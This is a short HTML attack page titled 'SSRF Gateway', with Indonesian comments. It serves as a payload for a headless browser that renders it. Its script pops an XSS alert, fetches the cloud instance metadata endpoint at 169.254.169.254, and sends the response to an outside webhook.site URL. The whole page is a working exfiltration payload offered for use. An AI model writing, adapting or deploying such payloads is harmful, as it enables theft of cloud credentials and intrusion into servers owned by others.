<!DOCTYPE html>
<html>
  <head>
    <title>SSRF Gateway</title>
    <script>
      // Basic XSS Alert
      alert("XSS berhasil");

      // Auto SSRF Pingback (jika headless browser render script ini)
      fetch("http://169.254.169.254/latest/meta-data/")
        .then(res => res.text())
        .then(data => {
          fetch("https://webhook.site/6f2949ee-f2df-4eff-9ce2-7c072db09037", {
            method: "GET",
            body: data
          });
        });
    </script>
  </head>
  <body>
    <h1>Payload Aktif</h1>
  </body>
</html>
